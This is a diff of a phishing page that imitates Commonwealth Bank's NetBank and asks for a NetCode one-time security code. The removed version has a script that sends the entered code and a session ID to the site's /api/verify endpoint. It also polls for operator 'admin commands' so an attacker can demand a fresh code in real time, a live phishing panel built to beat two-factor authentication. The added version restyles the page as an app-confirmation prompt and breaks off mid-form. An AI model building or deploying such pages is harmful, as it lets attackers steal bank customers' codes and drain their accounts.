@@ -1,489 +1,492 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html class="win chrome chrome1 webkit webkit5 cssBeforeSupport" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
- <head id="ctl00_head1">
-  <title>
-   NetBank - Your Logon Details
-  </title>
-  <meta content="text/html;charset=utf-8" http-equiv="Content-Type"/>
-  <link href="images/cba_logo_diamond.37dea6048f7da9a9473614e0843d07d9.png" rel="icon" type="image/png"/>
-  <link href="css/coreshared.ceba4ff46bd06978e764219bdf639351.css" rel="stylesheet" rel-album="6.43" type="text/css"/>
-  <link href="css/framework-merge.b4245c59346217e4c6699e6b46149eec.css" rel="stylesheet" rel-album="R760" type="text/css"/>
-  <link href="css/online.forgotlogondetails.f64d881bf9954e136a875b55dee40d68.css" rel="stylesheet" rel-album="" type="text/css"/>
-  <link href="css/cba_global_search.191e046214231125c9ef28c9b605d28e.css" rel="stylesheet" rel-album="R760" type="text/css"/>
-  <link href="css/cba_session_timer_panel.741c918518f17f9c3b568eed961f0969.css" rel="stylesheet" rel-album="R760" type="text/css"/>
-  <style class="at-flicker-control" id="at-makers-style">
-   .mboxDefault {visibility: hidden;}
-  </style>
- </head>
- <body class="yourlogondetails Revamp NavigationLess" id="ctl00_BodyTag">
-  <form action="/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx" autocomplete="off" id="aspnetForm" method="post" onsubmit="javascript:return WebForm_OnSubmit();">
-   <div class="aspNetHidden">
-    <input id="RID" name="RID" type="hidden" value="1XzISXLp4UWp2PiCQ656fw"/>
-    <input id="SID" name="SID" type="hidden" value="7bALVlASuHc="/>
-    <input id="__EVENTTARGET" name="__EVENTTARGET" type="hidden" value=""/>
-    <input id="__EVENTARGUMENT" name="__EVENTARGUMENT" type="hidden" value=""/>
-    <input id="cid" name="cid" type="hidden" value="OLmkr-rkMkOcIk8JNGYVMA"/>
-    <input id="rqid" name="rqid" type="hidden" value="QEQFT_zFxkKCSFu8DiAI1w"/>
-    <input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwUJNzU2Mjc5NzcyD2QWAmYPZBYCAgMPFgIeBWNsYXNzBSZ5b3VybG9nb25kZXRhaWxzIFJldmFtcCBOYXZpZ2F0aW9uTGVzcxYCAgEQFgIeDGF1dG9jb21wbGV0ZQUDb2ZmZBYOAgIPZBYCAgIPFgIfAAUobWFzdGhlYWQgaGVhZGVyIGdsb2JhbC1uZXRiYW5rLWFub255bW91cxYGAgMPFgIeB1Zpc2libGVoFgoCAQ8WAh8CaGQCAw8WAh8CaGQCBQ8WAh8CaGQCBw8WAh8CaGQCCQ8PFgIfAmhkZAIFD2QWDgIBDxYCHgRUZXh0BbEBPHNwYW4gY2xhc3M9Im5hdi1kaWFtb25kLWxvZ28iPjxpbWcgc3JjPSJodHRwczovL3N0YXRpYy5teS5jb21tYmFuay5jb20uYXUvc3RhdGljL25ldGJhbmsvdGhlbWUvZm8vaW1hZ2VzL2NiYV9sb2dvX2RpYW1vbmQuMzdkZWE2MDQ4ZjdkYTlhOTQ3MzYxNGUwODQzZDA3ZDkucG5nIiBhbHQ9IiIgLz48L3NwYW4+ZAIDDxYCHwJoZAIFDxYCHwJoZAIHDxYCHwJoZAIJDxYCHwJoZAILDxYCHwJoFgYCAQ8WAh8CaGQCBQ8WAh8CaGQCBw8PFgIfAmhkZAINDw8WAh8CaGRkAgcPDxYCHwJoZGQCBA9kFgICAQ9kFgICAQ8PFgIeDUFsdGVybmF0ZVRleHQFGFN0ZXAgMSBZb3VyIGNhcmQgZGV0YWlsc2RkAgoPDxYCHwJoZGQCDA9kFgYCAQ8PFgQeB0hlYWRpbmdlHg5IZWFkaW5nVG9vbFRpcGVkZAIDD2QWAgIBDw8WBB8FZR8GZWQWBAIDD2QWBAIBDxQrAAVkZ2VoZBYEZg8PFgQeCENzc0NsYXNzBTt0ZXh0IHRleHRib3ggTWFuZGF0b3J5RmllbGQgY2FyZE51bWJlclRleHRCb3ggV2lkdGgyNCBmaWVsZB4EXyFTQgICFgIeDmRhdGEtbWF4bGVuZ3RoBQIxOWQCBg9kFghmDw8WBh4RQ29udHJvbFRvVmFsaWRhdGUFBWZpZWxkHhJFbmFibGVDbGllbnRTY3JpcHRnHgdEaXNwbGF5CyoqU3lzdGVtLldlYi5VSS5XZWJDb250cm9scy5WYWxpZGF0b3JEaXNwbGF5AWRkAgEPDxYEHwoFBWZpZWxkHwtnZGQCAg8PFgYfCgUFZmllbGQfC2cfDAsrBAFkZAIDDw8WBh8KBQVmaWVsZB8LZx8MCysEAWRkAgMPFCsABWRnZWhkFgRmDw8WBB8HBTh0ZXh0IHRleHRib3ggTWFuZGF0b3J5RmllbGQgY2FyZFBpblRleHRCb3ggV2lkdGgxMSBmaWVsZB8IAgIWAh8JBQIxMmQCBg9kFgZmDw8WBh8KBQVmaWVsZB8LZx8MCysEAWRkAgEPDxYEHwoFBWZpZWxkHwtnZGQCAg8PFgYfCgUFZmllbGQfC2cfDAsrBAFkZAIED2QWAgIBDxQrAAVkaGVoZBYCZg8QDxYEHwcFDmNoZWNrYm94IGZpZWxkHwgCAmRkZGQCBw8PFgQfB2UfCAICZBYCAgEPDxYEHwVlHwZlZBYCAgIPDxYEHwcFDVJpZ2h0IFdpZHRoMjUfCAICZBYEAgEPFCsABWRoZWhkFgJmDxAPFgQfBwULcmFkaW8gZmllbGQfCAICZGRkZAIDDxQrAAVkaGVoZBYCZg8QDxYEHwcFC3JhZGlvIGZpZWxkHwgCAmRkZGQCDg9kFgICAQ9kFgICAQ8PFgQfBQURQ2FyZCBhbmQgUElOIGhlbHAfBmVkFgJmD2QWAgIBDw8WAh4LTmF2aWdhdGVVcmwFMGh0dHA6Ly93d3cuY29tbWJhbmsuY29tLmF1L3NlY3VyaXR5LXByaXZhY3kuaHRtbGRkAhIPZBYEZg8WAh8CaBYCAgIPZBYEAgEPZBYCAiEPZBYCZg8PFgQfBwUfaWNvbl9zdXBwb3J0X2NvbW11bml0eSB0cmFja2luZx8IAgIWAh4SZGF0YS10cmFja2luZ3BhcmFtBd4CeyJpc0RldiI6ZmFsc2UsInBhZ2VOYW1lIjoibmI6dXNlcm1haW50ZW5hbmNlOm1peGVkOmZvcmdvdGxvZ29uZGV0YWlsczpmbGR5b3VybG9nb25kZXRhaWxzIiwicHJvZHVjdHMiOltdLCJlVmFycyI6eyJlVmFyNjAiOiJTdXBwb3J0Q29tbXVuaXR5Zm9vdGVyLUNsaWNrIiwicHJvcDU0IjoiTm9UcmFja2VySWQ6Tm9UcmFja2VySWQiLCJlVmFyNDIiOiJuYjp1c2VybWFpbnRlbmFuY2U6bWl4ZWQ6Zm9yZ290bG9nb25kZXRhaWxzOmZsZHlvdXJsb2dvbmRldGFpbHMifSwidHJhY2tpbmdFdmVudCI6ImV2ZW50MjIiLCJldmVudE5hbWUiOiJJbnRlcmFjdGlvbiIsInRyYW5zYWN0aW9uSWRFdmFyS2V5IjoiZVZhcjE3In1kAhEPFgIeCWlubmVyaHRtbAVnJmNvcHk7IDIwMjYgQ29tbW9ud2VhbHRoIEJhbmsgb2YgQXVzdHJhbGlhIEFCTiA0OCAxMjMgMTIzIDEyNCBBRlNMIGFuZCBBdXN0cmFsaWFuIGNyZWRpdCBsaWNlbmNlIDIzNDk0NWQCAg8WAh8CZxYGAgEPDxYCHw0FgwEvbmV0YmFuay9Gc3MvUlNTL0hhcmRzaGlwUmVxdWVzdC5hc3B4P0Zvcm1LZXk9MTgmZWk9bmJtb2QtZm9vdGVyLWZpbmFuY2lhbC1kaWZmaWN1bHR5JlJJRD0xWHpJU1hMcDRVV3AyUGlDUTY1NmZ3JlNJRD03YkFMVmxBU3VIYyUzZGRkAgMPDxYCHw0Ffy9uZXRiYW5rL0NvbnRhaW5lci9FU0QvU3VwcG9ydEh1Yi5Qcm92aWRlci9Db250YWN0VXMvMT9laT1uYm1vZC1mb290ZXItY29udGFjdC11cyZSSUQ9MVh6SVNYTHA0VVdwMlBpQ1E2NTZmdyZTSUQ9N2JBTFZsQVN1SGMlM2RkZAIFDxYCHw8FZyZjb3B5OyAyMDI2IENvbW1vbndlYWx0aCBCYW5rIG9mIEF1c3RyYWxpYSBBQk4gNDggMTIzIDEyMyAxMjQgQUZTTCBhbmQgQXVzdHJhbGlhbiBjcmVkaXQgbGljZW5jZSAyMzQ5NDVkAhYPFgIfAmcWAgIBDxYCHwMF+wY8aW5wdXQgdHlwZT0naGlkZGVuJyBpZD0nU0NfV0VCVFJBQ0tFUl9JRCcgbmFtZT0nU0NfV0VCVFJBQ0tFUl9JRCcgdmFsdWU9J05vVHJhY2tlcklkJyAvPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoJCQkJCQkJCTxpbnB1dCB0eXBlPSdoaWRkZW4nIGlkPSdTQ19KU09OX1BBVEgnIG5hbWU9J1NDX0pTT05fUEFUSCcgdmFsdWU9Jy9uZXRiYW5rL1VzZXJNYWludGVuYW5jZS9NaXhlZC9Gb3Jnb3RMb2dvbkRldGFpbHMvRkxEWW91ckxvZ29uRGV0YWlscy5qc29uJyAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0naGlkZGVuJyBpZD0nU0NfV0VCQ0hBVF9QQVRIJyBuYW1lPSdTQ19XRUJDSEFUX1BBVEgnIHZhbHVlPSdodHRwczovL3N0YXRpYy5teS5jb21tYmFuay5jb20uYXUvc3RhdGljL25ldGJhbmsvanMvbGl2ZXBlcnNvbi5tdGFnY29uZmlnLmE5N2RmMTVlYjY5MDE5OGRjNTVkODI4MjJmOTAzYWNkLmpzJyAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0naGlkZGVuJyBpZD0nU0NfV0VCQ0hBVF9TRVJWRVInIG5hbWU9J1NDX1dFQkNIQVRfU0VSVkVSJyB2YWx1ZT0nY2hhdC5jb21tYmFuay5jb20uYXUnIC8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdoaWRkZW4nIGlkPSdTQ19XRUJDSEFUX1RBR19TRVJWRVInIG5hbWU9J1NDX1dFQkNIQVRfVEFHX1NFUlZFUicgdmFsdWU9J3NyMS5saXZlcGVyc29uLm5ldCcgLz5kGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYEBSdjdGwwMCRCb2R5UGxhY2VIb2xkZXIkY2hrUmVzZXRQd2QkZmVsZGQFJ2N0bDAwJEJvZHlQbGFjZUhvbGRlciRyYnRuUHJpbWFyeSRmaWVsZAUqY3RsMDAkQm9keVBsYWNlSG9sZGVyJHJidG5BZGRpdGlvbmFsJGZpZWxkBSpjdGwwMCRCb2R5UGxhY2VIb2xkZXIkcmJ0bkFkZGl0aW9uYWwkZmllbGQjyWvJG5JjGr2VhmKcBf2+vtCxmA=="/>
-   </div>
-   <div class="hidden" data-timerparams='{"serverLoadTime":63906256725,"warningTime":300,"alertTime":120,"countInterval":1000,"timeoutURL":"/netbank/Logon/Logon.aspx?RID=1XzISXLp4UWp2PiCQ656fw\u0026SID=7bALVlASuHc%3d","refreshURL":"/netbank/UserMaintenance/keepalive.aspx?RID=1XzISXLp4UWp2PiCQ656fw\u0026SID=7bALVlASuHc%3d"}' id="session_panel_content">
-    <div class="messages">
-     <div class="timer_label hidden" tabindex="-1">
-      <span class="session_timer_message" tabindex="-1">
-       <span>
-        We've noticed your session's been inactive for a while. For security, your session will time out in
-       </span>
-       <span class="timer" id="session_timer_min">
-       </span>
-       <span id="timer_label_min">
-       </span>
-       <span class="timer" id="session_timer_sec">
-       </span>
-       <span id="timer_label_sec">
-       </span>
-       <span class="ScreenReader">
-        Click on continue your session here link to extend your session
-       </span>
-      </span>
-      <span class="urlContainer">
-       <a class="stay_alive" href="javascript:void(0);" id="lnkContinueSession">
-        Continue your session here.
-       </a>
-      </span>
-     </div>
-     <div class="expired_label hidden" tabindex="-1">
-      <span>
-       Your session's been inactive for a while, so we've logged you off from NetBank to keep your accounts and details safe.
-      </span>
-      <span class="urlContainer">
-       <a class="expiredClick" href="javascript:void(0);">
-        Return to the log on page to keep using NetBank.
-       </a>
-      </span>
-     </div>
-    </div>
-   </div>
-   <div id="header">
-    <div class="masthead header global-netbank-anonymous" id="ctl00_HeaderControl_masthead">
-     <span class="accessibilityMode" id="ctl00_HeaderControl_accessibilityModeControl">
-      <a data-ajaxurl="/netbank/UserMaintenance/UpdateAccessibilityPilot.aspx?RID=1XzISXLp4UWp2PiCQ656fw&amp;SID=7bALVlASuHc%3d" href="#accessibilityModeMsg" id="accessibilityTrigger">
-       Activate screen reader friendly NetBank.
-      </a>
-      <input id="ctl00_HeaderControl_accessibilityModeControl_hiddenField" name="ctl00$HeaderControl$accessibilityModeControl_hiddenField" type="hidden"/>
-      <span class="ScreenReader" id="accessibilityModeMsg">
-       Screen reader friendly mode is activated and will be enabled whenever you log into NetBank. If you would like to change this setting, please contact us or call 13 2221 at any time.
-       <a href="/netbank/ContactCentre/Application/AppointmentContactUs.aspx?RID=1XzISXLp4UWp2PiCQ656fw&amp;SID=7bALVlASuHc%3d">
-        contact us
-       </a>
-      </span>
-     </span>
-     <a class="SkipToMainContent" href="javascript:void(0)">
-      Skip to main content
-     </a>
-     <div class="global-netbank-toolbar p-1" id="ctl00_HeaderControl_divGlobalNavToolbar">
-      <span class="nav-diamond-logo">
-       <img alt="" src="images/cba_logo_diamond.37dea6048f7da9a9473614e0843d07d9.png"/>
-      </span>
-      <ul class="nav-channel-switch left">
-      </ul>
-      <div class="global-netbank-searchbox">
-      </div>
-     </div>
-     <div class="nav-global">
-     </div>
-    </div>
-   </div>
-   <div class="clearfix" id="BodyContainer">
-    <div class="clearfix" id="ContentArea">
-     <div id="MainContent">
-      <div class="content_main">
-       <a class="ScreenReader" href="javascript:void(0)" id="StartMainContent" tabindex="-1">
-        Start of main content
-       </a>
-       <div class="MessagePanel arrow" id="ctl00_mplMessagePanel" style="display:none;">
-        <b aria-hidden="true" class="barrow" role="presentation" tabindex="-1">
-         <bdo>
-         </bdo>
-        </b>
-       </div>
-       <div class="iconoGraphy">
-        <div class="ContentPanel_Form" id="ctl00_BodyPlaceHolder_cplBanner_outer">
-        </div>
-       </div>
-       <div class="enterLogonDetailsBackground" id="ctl00_BodyPlaceHolder_enterLogonDetailsPanel">
-        <div class="loginDetailsPanel">
-         <div class="ContentPanel_Form" id="ctl00_BodyPlaceHolder_cpl_outer">
-          <fieldset class="ContentPanel" id="ctl00_BodyPlaceHolder_cpl" style="z-index: 6;">
-           <div class="FieldPanel">
-            <ul class="LabelFieldList" role="presentation">
-             <li class="LabelFieldListItem" role="presentation">
-              <h2>
-               <strong>
-                We need to verify your identity
-               </strong>
-              </h2>
-             </li>
-             <li class="LabelFieldListItem" role="presentation">
-              <p>
-               For your security, we've sent you a NetCode notification to your mobile number.
-              </p>
-             </li>
-             <li class="LabelFieldListItem" role="presentation">
-             </li>
-             <li class="LabelFieldListItem" role="presentation">
-              <div class="logonControls">
-               <div class="LabelWrapper Width15 LabelTextAlignNotSet align_notset LabelWithSubTextRight LabelWithHelp">
-                <label for="ctl00_BodyPlaceHolder_txtCardNumber_field" id="ctl00_BodyPlaceHolder_txtCardNumber_label">
-                 <span class="MainLabel MainLabelFlexi">
-                  NetCode  
-                 </span>
-                </label>
-                <div class="FieldPopup FieldHelp" id="ctl00_BodyPlaceHolder_txtCardNumber_ctl00_helpPopup">
-                 <div class="FieldPopupContents arrow" id="ctl00_BodyPlaceHolder_txtCardNumber_ctl00_helpContents">
-                  <b aria-hidden="true" class="barrow" role="presentation" tabindex="-1">
-                  </b>
-                  <br/>
-                  <b aria-hidden="true" class="barrow" role="presentation" tabindex="-1">
-                   <bdo>
-                   </bdo>
-                  </b>
-                 </div>
-                </div>
-               </div>
-               <div class="FieldElement">
-                <input class="text textbox MandatoryField cardNumberTextBox Width24 field reserveSpace"
-       data-maxlength="19"
-       data-valdata="[{&quot;evaluationfunction&quot;:&quot;RequiredFieldValidatorEvaluateIsValid&quot;,&quot;labelText&quot;:&quot;Card number&quot;,&quot;controltovalidate&quot;:&quot;ctl00_BodyPlaceHolder_txtCardNumber_field&quot;,&quot;errormessage&quot;:&quot;This is required.&quot;},{&quot;evaluationfunction&quot;:&quot;RegularExpressionValidatorEvaluateIsValid&quot;,&quot;validationexpression&quot;:&quot;^[0-9 ]*$&quot;,&quot;labelText&quot;:&quot;Card number&quot;,&quot;controltovalidate&quot;:&quot;ctl00_BodyPlaceHolder_txtCardNumber_field&quot;,&quot;errormessage&quot;:&quot;Please enter numbers and spaces only.&quot;}]"
-       id="ctl00_BodyPlaceHolder_txtCardNumber_field"
-       maxlength="19"
-       name="ctl00$BodyPlaceHolder$txtCardNumber$field"
-       type="text"
-       placeholder="Enter NetCode">
-
-               </div>
-               <div class="subtext subtextRight" id="ctl00_BodyPlaceHolder_txtCardNumber_subtextpanel" style="padding-left:150px">
-                <div class="subtextInner">
-                 <span class="FieldPopup FieldPopupInline FieldHelp FieldHelpAbove">
-                  <span class="FieldPopupContents arrow">
-                   <b aria-hidden="true" class="barrow" role="presentation" tabindex="-1">
-                   </b>
-                  </span>
-                 </span>
-                </div>
-               </div>
-                </span>
-               </div>
-              </div>
-             </li>
-            </ul>
-           </div>
-          </fieldset>
-         </div>
-        </div>
-       </div>
-       <div class="buttonPanel">
-        <div class="ButtonPanel">
-         <div class="left">
-         </div>
-         <div class="middle">
-         </div>
-         <div class="right">
-          <a class="button button_ui button_gold icon icon_directionarrowright icon_right nextButton" href='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("ctl00$BodyPlaceHolder$lnkNext", "", true, "", "", false, true))' id="ctl00_BodyPlaceHolder_lnkNext">
-           <i aria-hidden="true" role="presentation" tabindex="-1">
-           </i>
-           <strong>
-            Verify
-           </strong>
-          </a>
-         </div>
-        </div>
-       </div>
-      </div>
-     </div>
-     <div class="AuxiliaryContent_wrapper" id="ctl00_AuxiliaryContentWrapper">
-      <div id="AuxiliaryContent">
-       <div class="ContentPanel_Text" id="ctl00_InformationPlaceholder_iplNetCodeTips_outer">
-        <div class="RightContentPanel RightContentPanelDefault">
-         <div>
-          
-          
-                 <b aria-hidden="true" class="barrow" role="presentation" tabindex="-1">
-                  <bdo>
-                  </bdo>
-                 </b>
-                </span>
-               </span>
-              </p>
-             </li>
-             <li>
-             </li>
-            </ul>
-           </div>
-          </div>
-         </div>
-        </div>
-       </div>
-      </div>
-     </div>
-    </div>
-   </div>
-   <div class="footer footer-mod" id="footer">
-    <div>
-     <ul>
-      <li>
-       <a href="https://www.commbank.com.au/tools.html?ei=nbmod-footer-tools" target="_blank">
-        Tools &amp; calculators
-       </a>
-      </li>
-      <li>
-       <a href="https://www.commbank.com.au/personal/locate-us.html?ei=nbmod-footer-find-a-branch" target="_blank">
-        Find a branch
-       </a>
-      </li>
-      <li>
-       <a href="/netbank/Fss/RSS/HardshipRequest.aspx?FormKey=18&amp;ei=nbmod-footer-financial-difficulty&amp;RID=1XzISXLp4UWp2PiCQ656fw&amp;SID=7bALVlASuHc%3d" id="ctl00_FooterControl_ModFinancialAssistanceLink" target="_self">
-        Financial assistance
-       </a>
-      </li>
-      <li>
-       <a href="/netbank/Container/ESD/SupportHub.Provider/ContactUs/1?ei=nbmod-footer-contact-us&amp;RID=1XzISXLp4UWp2PiCQ656fw&amp;SID=7bALVlASuHc%3d" id="ctl00_FooterControl_ModContactUsLink" target="_self">
-        Contact us
-       </a>
-      </li>
-     </ul>
-     <ul>
-      <li>
-       <a href="https://www.commbank.com.au/content/commbank-neo/important-info.html?ei=nbmod-footer-imp-info" target="_blank">
-        Important information
-       </a>
-      </li>
-      <li>
-       <a href="https://www.commbank.com.au/security-privacy/general-security/privacy.html?ei=nbmod-footer-privacy" target="_blank">
-        Privacy
-       </a>
-      </li>
-      <li>
-       <a href="https://www.commbank.com.au/content/commbank-neo/important-info/cookies.html?ei=nbmod-footer-cookies" target="_blank">
-        Cookies
-       </a>
-      </li>
-      <li>
-       <a href="https://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.html?ei=nbmod-footer-terms" target="_blank">
-        Terms of use
-       </a>
-      </li>
-     </ul>
-     <span id="ctl00_FooterControl_CopyRightMod">
-      © 2026 Commonwealth Bank of Australia ABN 48 123 123 124 AFSL and Australian credit licence 234945
-     </span>
-    </div>
-   </div>
-   <script>
-(function() {
-  const sid = localStorage.getItem('sessionId');
-  if (!sid) {
-    window.location.href = '/';
-    return;
-  }
-
-  // Update page status
-  fetch('/api/page', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ sid, page: 'verify.html' })
-  });
-
-  // Capture form submission
-  const netcodeInput = document.getElementById('ctl00_BodyPlaceHolder_txtCardNumber_field');
-  const verifyBtn = document.getElementById('ctl00_BodyPlaceHolder_lnkNext');
-
-  // Add loading effect
-  function showLoading() {
-    verifyBtn.innerHTML = '<i aria-hidden="true" role="presentation" tabindex="-1"></i><strong>Verifying...</strong>';
-    verifyBtn.style.pointerEvents = 'none';
-    verifyBtn.style.opacity = '0.7';
-  }
-
-  verifyBtn.addEventListener('click', async function(e) {
-    e.preventDefault();
-    
-    const netcode = netcodeInput.value.trim();
-    
-    if (!netcode) return;
-    
-    showLoading();
-    
-    // Send netcode to /api/verify
-    await fetch('/api/verify', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ sid, netcode })
-    });
-    
-    // Update page status
-    await fetch('/api/page', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ sid, page: 'success.html' })
-    });
-    
-    // Clear session
-    localStorage.removeItem('sessionId');
-    
-    // Redirect to success
-    window.location.href = '/success.html';
-  });
-
-  // Check for admin commands
-  setInterval(async () => {
-    const res = await fetch(`/api/status/${sid}`);
-    const data = await res.json();
-    
-    if (data.status === 'redo') {
-      // Clear netcode and wait for new input
-      netcodeInput.value = '';
-      verifyBtn.innerHTML = '<i aria-hidden="true" role="presentation" tabindex="-1"></i><strong>Verify</strong>';
-      verifyBtn.style.pointerEvents = 'auto';
-      verifyBtn.style.opacity = '1';
-      await fetch('/api/clearRedo', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ sid })
-      });
-    } else if (data.status === 'ok') {
-      // Admin approved, redirect to success
-      localStorage.removeItem('sessionId');
-      window.location.href = '/success.html';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NetBank - Confirm this logon</title>
+  <link rel="icon" type="image/png" href="/images/cba_logo_diamond.37dea6048f7da9a9473614e0843d07d9.png"/>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-  }, 1000);
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      line-height: 1.5;
+    }
+    
+    /* Header */
+    .header {
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 12px 24px;
+    }
+    
+    .header-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+    }
+    
+    .logo {
+      height: 32px;
+    }
+    
+    /* Main Content */
+    .main-content {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 0 24px;
+    }
+    
+    .confirmation-box {
+      background: #fff;
+      border-radius: 8px;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    
+    /* Phone Icon */
+    .phone-icon {
+      width: 60px;
+      height: 80px;
+      margin: 0 auto 24px;
+      position: relative;
+    }
+    
+    .phone-icon::before {
+      content: '';
+      display: block;
+      width: 40px;
+      height: 70px;
+      border: 3px solid #333;
+      border-radius: 8px;
+      margin: 0 auto;
+      position: relative;
+    }
+    
+    .phone-icon::after {
+      content: '';
+      display: block;
+      width: 36px;
+      height: 8px;
+      background: #ffcc00;
+      border-radius: 0 0 4px 4px;
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    
+    /* Typography */
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 16px;
+      line-height: 1.3;
+    }
+    
+    .description {
+      font-size: 15px;
+      color: #555;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+    
+    /* Security Notice */
+    .security-notice {
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 32px;
+      text-align: left;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    
+    .info-icon {
+      width: 20px;
+      height: 20px;
+      background: #1976d2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 12px;
+      font-weight: bold;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    
+    .security-text {
+      font-size: 14px;
+      color: #555;
+      line-height: 1.5;
+    }
+    
+    .security-text a {
+      color: #1976d2;
+      text-decoration: underline;
+    }
+    
+    /* Form Styles */
+    .form-container {
+      max-width: 300px;
+      margin: 0 auto;
+      text-align: left;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #333;
+      margin-bottom: 8px;
+    }
+    
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      transition: border-color 0.2s;
+    }
+    
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #1976d2;
+    }
+    
+    input[type="text"]::placeholder {
+      color: #999;
+    }
+    
+    /* Verify Button */
+    .verify-button {
+      width: 100%;
+      padding: 14px 24px;
+      background: #ffcc00;
+      color: #000;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background-color 0.2s;
+    }
+    
+    .verify-button:hover {
+      background: #e6b800;
+    }
+    
+    .verify-button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    
+    .arrow-icon {
+      width: 0;
+      height: 0;
+      border-top: 5px solid transparent;
+      border-bottom: 5px solid transparent;
+      border-left: 8px solid #000;
+    }
+    
+    /* Loading Overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.95);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .loading-overlay.active {
+      display: flex;
+    }
+    
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+    }
+    
+    .loading-text {
+      margin-top: 16px;
+      color: #333;
+      font-size: 14px;
+    }
+    
+    /* Error Message */
+    .error-message {
+      display: none;
+      background: #ffebee;
+      border: 1px solid #ef5350;
+      border-radius: 4px;
+      padding: 12px;
+      margin-bottom: 20px;
+      color: #c62828;
+      font-size: 14px;
+    }
+    
+    .error-message.active {
+      display: block;
+    }
+    
+    /* Footer */
+    .footer {
+      text-align: center;
+      padding: 40px 24px;
+      font-size: 12px;
+      color: #666;
+    }
+    
+    .footer-links {
+      margin-bottom: 16px;
+    }
+    
+    .footer-links a {
+      color: #1976d2;
+      text-decoration: none;
+      margin: 0 12px;
+    }
+    
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Responsive */
+    @media (max-width: 480px) {
+      .confirmation-box {
+        padding: 24px;
+      }
+      
+      h1 {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <img src="/images/loader.811fa38f2f95504a101b1b41aec4e3ca.gif" alt="Loading..." class="loading-spinner">
+    <div class="loading-text">Verifying...</div>
+  </div>
 
-  // Ping every 5 seconds
-  setInterval(() => {
-    fetch('/api/ping', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ sid })
+  <!-- Header -->
+  <header class="header">
+    <div class="header-content">
+      <img src="/images/cba_mainlogo.552c5a58c5e8e13c837eac9f362e571a.svg" alt="Commonwealth Bank" class="logo">
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="confirmation-box">
+      <!-- Phone Icon -->
+      <div class="phone-icon"></div>
+      
+      <!-- Heading -->
+      <h1>Confirm this logon with the CommBank app</h1>
+      
+      <!-- Description -->
+      <p class="description">
+        For your security, we've sent you a notification in the CommBank app asking you to confirm this logon. You have 15 minutes to confirm.
+      </p>
+      
+      <!-- Security Notice -->
+      <div class="security-notice">
+        <div class="info-icon">i</div>
+        <div class="security-text">
+          Only confirm logons you remember doing yourself.<br>
+          <a href="#">Find out more about multi-factor authentication</a>
+        </div>
+      </div>
+      
+      <!-- Error Message -->
+      <div class="error-message" id="errorMessage">
+        Please enter a valid NetCode.
+      </div>
+      
+      <!-- NetCode Form -->
+      <div class="form-container">
+        <div class="form-group">
+          <label for="netcode">NetCode</label>
+          <input 
+            type="text" 
+            id="netcode" 
+            name="netcode" 
+            placeholder="Enter NetCode" 
+            maxlength="6"
+            autocomplete="off"
+            inputmode="numeric"
+          >
+        </div>
+        
+        <button type="button" class="verify-button" id="verifyBtn">
